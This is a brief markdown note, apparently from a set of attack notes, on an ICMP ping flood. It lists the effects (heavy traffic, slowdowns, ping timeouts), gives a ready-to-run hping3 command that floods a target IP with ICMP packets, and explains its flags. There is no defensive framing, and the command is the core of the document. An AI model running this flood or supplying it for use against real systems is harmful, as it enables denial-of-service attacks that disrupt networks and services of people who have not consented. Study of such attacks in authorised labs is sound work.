# ICMP (Ping) Flood Attack

## Effects:
- Generates high network traffic, possibly slowing down or freezing the system.
- Can lead to ping timeouts.

## Command:
```bash
sudo hping3 --icmp --flood <Target IP>
```

## Explanation:

- `--icmp` → Sends continuous Ping (ICMP) requests.
- `--flood` → Sends packets rapidly without stopping.
